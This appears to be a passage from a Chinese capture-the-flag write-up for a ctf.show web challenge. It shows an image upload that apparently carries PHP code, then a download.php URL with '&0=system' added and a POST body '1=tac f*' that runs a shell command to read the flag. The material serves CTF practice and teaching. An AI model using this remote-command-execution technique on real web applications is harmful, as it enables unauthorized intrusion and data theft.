&lt;p&gt;发现上传成功，点击查看图片&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1XZK1AEEIFCoNT3T.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;再用记事本打开 2.png 查看下&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/rZKxODLM1kosoKAd.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来就是构造命令拿 flag 了，在 url 后面跟上 &amp;amp; 0=system&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2ViOWRiY2M0LTFjNjAtNDNiYy04Nzc1LWUyY2UwM2ExODMwYy5jaGFsbGVuZ2UuY3RmLnNob3cvZG93bmxvYWQucGhwP2ltYWdlPWZiNWM4MWVkM2EyMjAwMDRiNzEwNjk2NDVmMTEyODY3LnBuZyZhbXA7MD1zeXN0ZW0=&#34;&gt;http://eb9dbcc4-1c60-43bc-8775-e2ce03a1830c.challenge.ctf.show/download.php?image=fb5c81ed3a220004b71069645f112867.png&amp;amp;0=system&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7GjeGSPHN9WkwEXO.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;post data 传 1=tac f*&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/PTqEdUiMwu5GVDgR.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
